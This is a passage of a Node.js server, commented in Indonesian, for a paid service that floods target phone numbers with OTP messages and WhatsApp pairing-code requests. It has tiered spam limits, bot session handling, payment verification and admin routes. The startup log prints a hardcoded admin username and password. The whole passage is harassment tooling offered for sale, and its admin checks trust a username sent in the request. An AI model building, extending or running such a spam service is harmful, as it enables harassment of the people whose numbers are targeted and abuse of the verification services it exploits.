        // CEK LIMIT
        const limits = {
            'Free': 15,
            'Premium': 80,
            'VIP': 150,
            'Reseller': 200,
            'Developer': Infinity
        };
        
        const maxLimit = limits[user.status] || 15;
        
        if (user.limit !== Infinity && user.limit !== '∞' && user.limit !== null) {
            if (count > maxLimit) {
                return res.json({ success: false, message: `Maksimal spam untuk ${user.status} adalah ${maxLimit}x!` });
            }
            
            const remaining = user.limit - (user.used || 0);
            if (remaining <= 0) {
                return res.json({ success: false, message: 'Limit spam habis! Tunggu 1 jam untuk reset.' });
            }
            if (count > remaining) {
                return res.json({ success: false, message: `Sisa limit hanya ${remaining}!` });
            }
        }

        // Jalankan spam OTP
        const sessionId = `otp_${username}_${Date.now()}`;
        const result = await spamOTP(target, count, username, sessionId);
        
        // Update used
        if (result.success > 0) {
            user.used = (user.used || 0) + result.success;
            saveDB();
            io.emit('userUpdated', { username: user.username });
        }
        
        res.json({ 
            success: true, 
            result: {
                success: result.success,
                failed: result.failed,
                total: result.success + result.failed,
                details: result.details
            }
        });
    } catch (err) {
        console.error('❌ Error spam OTP:', err);
        res.json({ success: false, message: err.message || 'Terjadi kesalahan server!' });
    }
});

// ===== SPAM PAIRING =====
app.post('/api/spam/pairing', async (req, res) => {
    try {
        const { username, target, count, useBot } = req.body;
        
        if (!username) {
            return res.json({ success: false, message: 'Username tidak ditemukan!' });
        }
        
        const user = db.users.find(u => u.username === username);
        if (!user) {
            return res.json({ success: false, message: 'User tidak ditemukan! Silakan login ulang.' });
        }
        
        // CEK MAINTENANCE
        if (db.settings.maintenance && user.status !== 'Developer' && user.status !== 'VIP' && user.status !== 'Reseller') {
            return res.json({ 
                success: false, 
                message: db.settings.maintenanceMessage || 'Server sedang dalam perbaikan. Silakan coba lagi nanti.',
                maintenance: true
            });
        }
        
        if (!target) {
            return res.json({ success: false, message: 'Nomor target wajib diisi!' });
        }
        
        if (!count || count < 1) {
            return res.json({ success: false, message: 'Jumlah minimal 1!' });
        }
        
        // CEK LIMIT
        const limits = {
            'Free': 15,
            'Premium': 80,
            'VIP': 150,
            'Reseller': 200,
            'Developer': Infinity
        };
        
        const maxLimit = limits[user.status] || 15;
        
        if (user.limit !== Infinity && user.limit !== '∞' && user.limit !== null) {
            if (count > maxLimit) {
                return res.json({ success: false, message: `Maksimal spam untuk ${user.status} adalah ${maxLimit}x!` });
            }
            
            const remaining = user.limit - (user.used || 0);
            if (remaining <= 0) {
                return res.json({ success: false, message: 'Limit spam habis! Tunggu 1 jam untuk reset.' });
            }
            if (count > remaining) {
                return res.json({ success: false, message: `Sisa limit hanya ${remaining}!` });
            }
        }

        let result;
        const sessionId = `pairing_${username}_${Date.now()}`;
        
        if (useBot === true) {
            // Cari bot yang ready
            let botId = null;
            for (const [id, status] of Object.entries(botStatus)) {
                if (status === 'ready') {
                    botId = id;
                    break;
                }
            }
            
            if (botId && activeSockets[botId]) {
                const sock = activeSockets[botId];
                result = await spamPairingCode(sock, target, count, sessionId);
            } else {
                // Fallback tanpa bot
                result = await spamPairingWithoutBot(target, count, sessionId);
            }
        } else {
            result = await spamPairingWithoutBot(target, count, sessionId);
        }
        
        // Update used
        if (result.success > 0) {
            user.used = (user.used || 0) + result.success;
            saveDB();
            io.emit('userUpdated', { username: user.username });
        }
        
        res.json({ success: true, result });
    } catch (err) {
        console.error('❌ Error spam pairing:', err);
        res.json({ success: false, message: err.message || 'Terjadi kesalahan server!' });
    }
});

// ===== CONNECT BOT (HANYA UNTUK PAIRING CODE) =====
app.post('/api/bot/connect', async (req, res) => {
    try {
        const { number, username, method } = req.body;
        
        if (!number || !username) {
            return res.json({ success: false, message: 'Nomor dan username wajib diisi!' });
        }
        
        const user = db.users.find(u => u.username === username);
        if (!user) {
            return res.json({ success: false, message: 'User tidak ditemukan!' });
        }
        
        // CEK MAINTENANCE
        if (db.settings.maintenance && user.status !== 'Developer' && user.status !== 'VIP' && user.status !== 'Reseller') {
            return res.json({ 
                success: false, 
                message: db.settings.maintenanceMessage || 'Server sedang dalam perbaikan.',
                maintenance: true
            });
        }

        // Cek bot existing
        const existing = db.bots?.find(b => b.number === number && b.owner === username);
        if (existing) {
            if (fs.existsSync(`${AUTH_DIR}/${existing.id}/creds.json`)) {
                if (botStatus[existing.id] === 'ready') {
                    return res.json({
                        success: true,
                        message: 'Bot sudah terhubung!',
                        sessionId: existing.id,
                        alreadyConnected: true
                    });
                }
                
                try {
                    await createBot(existing.id, number, existing.method || 'qris');
                    botStatus[existing.id] = 'connecting';
                    return res.json({
                        success: true,
                        message: 'Bot sedang di-restore...',
                        sessionId: existing.id,
                        restored: true
                    });
                } catch (e) {
                    fs.removeSync(`${AUTH_DIR}/${existing.id}`);
                    if (db.bots) {
                        db.bots = db.bots.filter(b => b.id !== existing.id);
                        saveDB();
                    }
                }
            } else {
                if (db.bots) {
                    db.bots = db.bots.filter(b => b.id !== existing.id);
                    saveDB();
                }
            }
        }

        // Buat bot baru
        const sessionId = `${number}_${Date.now()}`;
        if (!db.bots) db.bots = [];
        db.bots.push({
            id: sessionId,
            number: number,
            owner: username,
            status: 'connecting',
            method: method || 'qris',
            pairingCode: null,
            connectedAt: new Date().toISOString()
        });
        saveDB();

        // Create bot
        createBot(sessionId, number, method || 'qris').catch(err => {
            console.log(`❌ Error creating bot: ${err.message}`);
        });
        
        botStatus[sessionId] = 'connecting';

        res.json({
            success: true,
            message: 'Bot sedang menghubungkan...',
            sessionId,
            method: method || 'qris'
        });
    } catch (err) {
        console.error('❌ Connect bot error:', err);
        res.json({ success: false, message: err.message });
    }
});

// ===== DISCONNECT BOT =====
app.post('/api/bot/disconnect', async (req, res) => {
    try {
        const { sessionId } = req.body;
        
        if (activeSockets[sessionId]) {
            try { await activeSockets[sessionId].end(); } catch (e) {}
            delete activeSockets[sessionId];
        }
        
        delete botStatus[sessionId];
        delete pairingCodeSent[sessionId];
        
        if (botReconnectTimers[sessionId]) {
            clearTimeout(botReconnectTimers[sessionId]);
            delete botReconnectTimers[sessionId];
        }
        
        if (db.bots) {
            db.bots = db.bots.filter(b => b.id !== sessionId);
            saveDB();
        }
        try { fs.removeSync(`${AUTH_DIR}/${sessionId}`); } catch (e) {}
        
        res.json({ success: true });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

// ===== GET BOTS =====
app.get('/api/bots', (req, res) => {
    try {
        const bots = (db.bots || []).map(b => ({
            id: b.id,
            number: b.number,
            owner: b.owner,
            status: botStatus[b.id] || b.status || 'disconnected',
            pairingCode: b.pairingCode || null,
            method: b.method || 'qris',
            isReady: (botStatus[b.id] === 'ready')
        }));
        res.json({ success: true, bots });
    } catch (err) {
        res.json({ success: false, bots: [] });
    }
});

// ============================================
// ADMIN API
// ============================================
app.get('/api/admin/users', (req, res) => {
    try {
        res.json({
            success: true,
            users: db.users.map(u => ({
                username: u.username,
                status: u.status,
                limit: u.limit === Infinity ? '∞' : u.limit,
                used: u.used,
                online: u.online || false,
                isAdmin: u.isAdmin,
                isDeveloper: u.isDeveloper,
                isReseller: u.isReseller
            }))
        });
    } catch (err) {
        res.json({ success: false, users: [] });
    }
});

app.post('/api/admin/update-status', (req, res) => {
    try {
        const { username, status, admin } = req.body;
        const adminUser = db.users.find(u => u.username === admin);
        if (!adminUser || !adminUser.isDeveloper) {
            return res.json({ success: false, message: 'Hanya Developer!' });
        }
        const user = db.users.find(u => u.username === username);
        if (!user) return res.json({ success: false, message: 'User tidak ditemukan!' });
        
        const limits = { 
            'Free': 15, 
            'Premium': 80, 
            'VIP': 150, 
            'Reseller': 200, 
            'Developer': Infinity 
        };
        
        user.status = status;
        user.limit = limits[status] || 15;
        user.used = 0;
        user.isReseller = (status === 'Reseller');
        user.isAdmin = (status === 'Developer');
        user.isDeveloper = (status === 'Developer');
        saveDB();
        io.emit('userUpdated', { username, action: 'status_change' });
        res.json({ success: true });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

app.post('/api/admin/ban', (req, res) => {
    try {
        const { username, admin } = req.body;
        const adminUser = db.users.find(u => u.username === admin);
        if (!adminUser || !adminUser.isDeveloper) {
            return res.json({ success: false, message: 'Hanya Developer!' });
        }
        db.users = db.users.filter(u => u.username !== username);
        if (db.bots) {
            db.bots = db.bots.filter(b => b.owner !== username);
        }
        saveDB();
        io.emit('userUpdated', { username, action: 'banned' });
        res.json({ success: true });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

app.post('/api/admin/settings', (req, res) => {
    try {
        const { settings, admin } = req.body;
        const adminUser = db.users.find(u => u.username === admin);
        if (!adminUser || !adminUser.isDeveloper) {
            return res.json({ success: false, message: 'Hanya Developer!' });
        }
        db.settings = settings;
        saveDB();
        io.emit('settingsUpdated', { settings });
        res.json({ success: true });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

app.get('/api/admin/payments', (req, res) => {
    try {
        res.json({ success: true, payments: db.payments || [] });
    } catch (err) {
        res.json({ success: false, payments: [] });
    }
});

app.post('/api/admin/verify-payment', (req, res) => {
    try {
        const { paymentId, admin } = req.body;
        const adminUser = db.users.find(u => u.username === admin);
        if (!adminUser || !adminUser.isAdmin) {
            return res.json({ success: false, message: 'Unauthorized!' });
        }
        const payment = db.payments.find(p => p.id === paymentId);
        if (!payment) return res.json({ success: false, message: 'Payment tidak ditemukan!' });
        payment.status = 'verified';
        const user = db.users.find(u => u.username === payment.username);
        if (user) {
            const limits = { Premium: 80, VIP: 150, Reseller: 200 };
            user.status = payment.package;
            user.limit = limits[payment.package] || 15;
            user.used = 0;
            user.isReseller = (payment.package === 'Reseller');
        }
        saveDB();
        io.emit('paymentStatus', { status: 'success', message: `Pembayaran ${payment.package} diverifikasi!` });
        io.emit('userUpdated', { username: payment.username, action: 'payment_verified' });
        res.json({ success: true });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

app.post('/api/admin/reject-payment', (req, res) => {
    try {
        const { paymentId, reason, admin } = req.body;
        const adminUser = db.users.find(u => u.username === admin);
        if (!adminUser || !adminUser.isAdmin) {
            return res.json({ success: false, message: 'Unauthorized!' });
        }
        const payment = db.payments.find(p => p.id === paymentId);
        if (!payment) return res.json({ success: false, message: 'Payment tidak ditemukan!' });
        payment.status = 'rejected';
        payment.reason = reason;
        saveDB();
        io.emit('paymentStatus', { status: 'error', message: `Pembayaran dibatalkan: ${reason}` });
        res.json({ success: true });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

// ===== PAYMENT SUBMIT =====
const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, UPLOAD_DIR),
    filename: (req, file, cb) => cb(null, `${Date.now()}-${file.originalname}`)
});
const upload = multer({ storage });

app.post('/api/payments/submit', upload.single('proof'), (req, res) => {
    try {
        const { username, package: pkg, name, paymentMethod } = req.body;
        const user = db.users.find(u => u.username === username);
        if (!user) return res.json({ success: false, message: 'User tidak ditemukan!' });
        if (!req.file) return res.json({ success: false, message: 'Upload bukti pembayaran!' });
        if (!db.payments) db.payments = [];
        db.payments.push({
            id: uuidv4(),
            username,
            package: pkg,
            amount: pkg === 'Premium' ? 10000 : pkg === 'VIP' ? 20000 : 30000,
            name,
            paymentMethod,
            proof: req.file.filename,
            status: 'pending',
            createdAt: new Date().toISOString()
        });
        saveDB();
        io.emit('paymentSubmitted', { username, package: pkg });
        res.json({ success: true, message: 'Pembayaran terkirim!' });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

// ============================================
// SOCKET.IO
// ============================================
const onlineUsers = new Set();

io.on('connection', (socket) => {
    console.log('⚡ User connected:', socket.id);

    socket.on('userOnline', (username) => {
        onlineUsers.add(username);
        const user = db.users.find(u => u.username === username);
        if (user) user.online = true;
        saveDB();
        io.emit('usersOnline', Array.from(onlineUsers));
        io.emit('userStatusChanged', { username, online: true });
    });

    socket.on('sendMessage', (data) => {
        if (!db.messages) db.messages = [];
        db.messages.push(data);
        if (db.messages.length > 1000) db.messages.shift();
        saveDB();
        io.emit('newMessage', data);
    });

    socket.on('disconnect', () => {
        console.log('⚡ User disconnected:', socket.id);
    });
});

// ===== RESET LIMIT SETIAP 1 JAM =====
setInterval(() => {
    const now = Date.now();
    db.users.forEach(user => {
        if (user.limit !== Infinity && user.limit !== '∞') {
            if (user.lastReset && (now - user.lastReset) >= 3600000) {
                user.used = 0;
                user.lastReset = now;
                console.log(`🔄 Reset limit untuk ${user.username}`);
            }
            if (!user.lastReset) {
                user.lastReset = now;
                user.used = 0;
            }
        }
    });
    saveDB();
    io.emit('usersUpdated', {});
}, 60000);

// ============================================
// START SERVER
// ============================================
const PORT = process.env.PORT || 3000;
server.listen(PORT, async () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log('========================================');
    console.log('👑 Admin: Lynzka / Asiafone11');
    console.log('📱 SPAM OTP & PAIRING READY!');
    console.log('========================================');
    console.log('🔥 45+ API OTP Services');
    console.log('========================================');
    console.log('📊 Limit per status:');
    console.log('   Free     : 15x');
    console.log('   Premium  : 80x');
    console.log('   VIP      : 150x');
    console.log('   Reseller : 200x');
    console.log('   Developer: Unlimited');
    console.log('========================================');
    console.log('⏰ Reset limit setiap 1 jam');
    console.log('========================================');
    console.log('🔄 Restoring bot sessions...');
    await restoreAllBots();
    console.log('✅ All done!');
    console.log('========================================');
});